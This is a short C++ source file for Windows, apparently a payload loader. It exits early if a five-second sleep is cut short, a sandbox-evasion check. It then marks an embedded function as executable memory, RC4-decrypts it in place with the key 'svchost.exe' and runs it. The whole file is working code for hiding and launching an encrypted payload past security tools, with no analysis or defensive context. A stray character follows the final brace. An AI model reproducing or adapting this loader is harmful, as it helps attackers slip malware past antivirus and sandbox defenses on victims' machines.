#include <stdio.h>
#include <Windows.h>
#include <chrono>
#include <thread>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

extern "C" void RunData();

void rc4(unsigned char* data, int len, const char* key) {

	int keylen = strlen(key);
	unsigned char s[256];
	for (int i = 0; i < 256; i++) {
		s[i] = i;
	}

	unsigned char j = 0;
	for (int i = 0; i < 256; i++) {
		j = (j + s[i] + key[i % keylen]) % 256;
		unsigned char tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}

	int i = 0;
	j = 0;

	for (int n = 0; n < len; n++) {
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		unsigned char tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		data[n] ^= s[(s[i] + s[j]) % 256];
	}

}


int main(int argc, char** argv) {
	auto start = std::chrono::system_clock::now();
	std::this_thread::sleep_for(std::chrono::seconds(5));
	auto end = std::chrono::system_clock::now();
	std::chrono::duration<double> elapsed_seconds = end - start;
	if (elapsed_seconds.count() <= 4.4) {
		exit(0);
	}

	//Run our payload function
	const char* key = "svchost.exe";
	int len = 10942172;
	DWORD oldProtect = 0;

	if (!VirtualProtect((LPVOID)&RunData, len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		printf("Error:  %d", GetLastError());
	}

	rc4((unsigned char*)&RunData, len, key);
	VirtualProtect((LPVOID)&RunData, len, oldProtect, &oldProtect);
	RunData();

}v
